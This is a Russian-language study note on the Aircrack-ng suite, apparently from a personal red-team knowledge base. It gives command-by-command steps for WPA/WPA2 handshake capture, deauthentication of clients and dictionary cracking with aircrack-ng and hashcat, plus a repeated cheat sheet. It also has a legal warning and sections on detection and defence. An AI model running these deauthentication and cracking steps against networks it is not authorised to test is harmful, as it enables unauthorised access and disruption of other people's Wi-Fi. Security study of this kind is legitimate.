---
type: tool
name: Aircrack-ng
category: Wi-Fi / Wireless Attacks
platform: Linux
language: C
status: studying
tags: [arsenal, wifi, wireless, aircrack, red-team]
mitre:
  - T1040      # Network Sniffing
  - T1110      # Brute Force
  - T1557      # Adversary-in-the-Middle
  - T1595      # Active Scanning
created: 2025-09-29
---

> [!info] 🛠️ ДОСЬЕ ИНСТРУМЕНТА
> **Название:** Aircrack-ng (набор)
> **Категория:** Wi-Fi / Wireless Attacks
> **Платформа:** Linux
> **Компоненты:** `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`
> **Назначение:** Аудит Wi-Fi сетей, захват handshake, взлом WPA/WPA2
> **Статус:** 🟡 Базовый уровень
> **Лаба:** [[IP-Table]]

---

## 📖 I. ЧТО ЭТО

**Aircrack-ng** — набор инструментов для аудита Wi-Fi:
- **`airmon-ng`** — включение режима монитора.
- **`airodump-ng`** — сканирование сетей и захват трафика.
- **`aireplay-ng`** — инъекция пакетов, деаутентификация.
- **`aircrack-ng`** — взлом WEP/WPA/WPA2.

**Что можно:**
- Обнаруживать Wi-Fi сети вокруг.
- Захватывать **handshake** (рукопожатие WPA/WPA2).
- Деаутентифицировать клиентов (форсировать handshake).
- Взламывать WPA/WPA2 по словарю.

> [!warning] Юридически
> Только для **своей** сети или с письменного разрешения. Взлом чужого Wi-Fi — статья (ст. 272 УК РФ).

---

## 🎯 II. ТРЕБОВАНИЯ

### Wi-Fi адаптер
Нужен адаптер, поддерживающий:
- **Режим монитора** (Monitor mode).
- **Инъекцию пакетов** (Packet Injection).

**Популярные:**
- **Alfa AWUS036NHA** — золотой стандарт.
- **TP-Link TL-WN722N v1** (v2/v3 — НЕ работают!).
- **Panda PAU09** — бюджетный.

> [!warning] Встроенный Wi-Fi ноутбука
> Обычно **не поддерживает** режим монитора. Нужен внешний USB-адаптер.

### Проверка поддержки

```bash
sudo airmon-ng
sudo iw list | grep -A 10 "Supported interface modes"
```

Ищи `monitor` в списке.

---

## 🎯 III. ТРОУБЛШУТИНГ: TP-Link TL-WN722N

> [!danger] Проблема
> TP-Link TL-WN722N **v2/v3** (чип RTL8188EU) не поддерживает режим монитора **из коробки**. Нужно пересобрать драйвер.

### Решение

```bash
# 1. Обновление
sudo apt update && sudo apt upgrade
sudo reboot

# 2. Установка headers
sudo apt install linux-headers-$(uname -r)

# 3. Удаление стандартного модуля
sudo rmmod r8188eu.ko

# 4. Блокировка стандартного драйвера
sudo echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"

# 5. Клонирование патченного драйвера
git clone https://github.com/aircrack-ng/rtl8188eus
cd rtl8188eus

# 6. Сборка и установка
make
sudo make install
sudo modprobe 8188eu
sudo reboot

# 7. После перезагрузки — убить мешающие процессы
sudo airmon-ng check kill

# 8. Включить режим монитора
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
sudo aireplay-ng --test wlan0
```

---

## 🚀 IV. ВКЛЮЧЕНИЕ РЕЖИМА МОНИТОРА

### Способ 1: iwconfig

```bash
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
sudo aireplay-ng --test wlan0
```

### Способ 2: airmon-ng (рекомендуется)

```bash
sudo airmon-ng start wlan0
```

Создаст новый интерфейс `wlan0mon` в режиме монитора.

> [!tip] Проверка
> ```bash
> iwconfig | grep "Mode"
> ```
> Должно быть `Mode:Monitor`.

---

## 🎯 V. АТАКА: ЗАХВАТ HANDSHAKE

### Шаг 1: Перезапуск сетевого менеджера (опционально)

```bash
sudo service NetworkManager restart
```

### Шаг 2: Сканирование сетей

```bash
sudo airodump-ng wlan0mon
```

Покажет все сети вокруг:
```
BSSID              PWR  CH  ENC   ESSID
5C:E9:31:DD:5A:F0  -45  11  WPA2  MyNetwork
AA:BB:CC:DD:EE:FF  -72   6  WPA2  Neighbor
```

Запиши:
- **BSSID** — MAC роутера.
- **CH** — канал.
- **ESSID** — имя сети.

### Шаг 3: Захват handshake

```bash
sudo airodump-ng -c <канал> --bssid <BSSID> -w handshake wlan0mon
```

Пример:
```bash
sudo airodump-ng -c 11 --bssid 5C:E9:31:DD:5A:F0 -w handshake wlan0mon
```

Файл `handshake-01.cap` будет содержать трафик.

### Шаг 4: Деаутентификация (форсировать handshake)

**Во втором окне терминала:**
```bash
sudo aireplay-ng -0 5 -a 5C:E9:31:DD:5A:F0 wlan0mon
```

- `-0 5` — 5 пакетов деаутентификации.
- `-a <BSSID>` — MAC роутера.

**Что произойдёт:** клиенты отключатся → при переподключении сгенерируется **handshake**.

> [!warning] Видно в логах
> Деаутентификация **видна** в сетевых логах. Мониторинг WIDS (Wireless IDS) её поймает.

### Шаг 5: Проверка handshake

В окне `airodump-ng` в правом верхнем углу появится:
```
WPA handshake: 5C:E9:31:DD:5A:F0
```

### Шаг 6: Взлом

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```

**Что делает:** перебирает пароли из словаря, проверяя handshake.

> [!tip] Если rockyou не распакован
> ```bash
> sudo gunzip /usr/share/wordlists/rockyou.txt.gz
> ```

### Шаг 7: Альтернатива через hashcat

```bash
# 1. Конвертировать в hc22000
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# 2. Взломать через hashcat (быстрее на GPU)
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

## 🛡️ VI. ДЕТЕКТ В WAZUH

> [!danger] MITRE
> - **T1040** — Network Sniffing
> - **T1110** — Brute Force
> - **T1557** — Adversary-in-the-Middle
> - **T1595** — Active Scanning

### Что видит защитник

| Источник | Что искать |
|---|---|
| **WIDS (Wireless IDS)** | Деаутентификация, сканирование Wi-Fi |
| **Router logs** | Деаутентификация клиентов, аномалии |
| **Wazuh Agent** | Запуск `aircrack-ng`, `airodump-ng` на хосте |
| **Suricata** | Деаутентификационные фреймы |
| **Kismet** | Обнаружение режима монитора |

### Признаки атаки

> [!danger] Красные флаги
> - **Массовая деаутентификация** клиентов (DoS).
> - **Сканирование** всех каналов.
> - **Неизвестный MAC** в режиме монитора.
> - **Захват handshake** — виден по эфиру.
> - **WIDS-сигнатуры** от Aruba, Cisco, Ubiquiti.

### Практика в лабе

1. С Kali: запусти `airodump-ng` на своём Wi-Fi.
2. Если есть WIDS — проверь алерты.
3. На роутере — логи деаутентификации.

> [!info] Как защититься
> - **WPA3** — устойчив к атакам по словарю.
> - **802.11w (PMF)** — защита от деаутентификации.
> - **Длинные пароли** — устойчивы к словарю.
> - **WIDS/WIPS** — обнаружение атак.
> - **Мониторинг эфира** — Kismet, Aruba AirWave.

---

## 🩺 VII. ТРОУБЛШУТИНГ

| Проблема | Решение |
|---|---|
| Адаптер не поддерживает monitor | Проверь `iw list`, нужен внешний USB-адаптер |
| `airmon-ng start` не создаёт `wlan0mon` | `sudo airmon-ng check kill` + перезапуск |
| Нет handshake | Увеличь деаутентификацию (`-0 10`), жди дольше |
| Медленно ломается | Используй hashcat с GPU |
| `rockyou.txt` не найден | `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| `monitor mode` пропадает | Отключи NetworkManager на интерфейсе |

---

## 🔗 VIII. СВЯЗИ

- **Инструменты:** [[hashcat]], [[bettercap]], [[wireshark]], [[kismet]]
- **Техники:** [[T1040]], [[T1110]], [[T1557]]
- **Лаба:** [[IP-Table]]
- **Защита:** [[Wazuh]], [[WIDS]]

---

## 📚 IX. ЧТО ИЗУЧИТЬ ДАЛЬШЕ

- [ ] **WPA3** — как работает, какие атаки возможны.
- [ ] **PMF (802.11w)** — защита от деаутентификации.
- [ ] **Evil Twin** — поддельная точка доступа.
- [ ] **Kismet** — пассивный мониторинг.
- [ ] **Wifite** — автоматизация Wi-Fi атак.
- [ ] **hcxdumptool** — современный захват PMKID.

---

## 📝 X. ШПАРГАЛКА

```bash
# Режим монитора
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Сканирование сетей
sudo airodump-ng wlan0mon

# Захват handshake
sudo airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon

# Деаутентификация (второе окно)
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon

# Взлом
aircrack-ng -w rockyou.txt handshake-01.cap

# Через hashcat
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

> [!abstract] 🐍 HYDRA DOMINATUS
> *Vigilo. Vexo. Vinco.*
> *Wi-Fi — это невидимый фронт. Пока другие воюют по проводам, Легион слышит эфир.*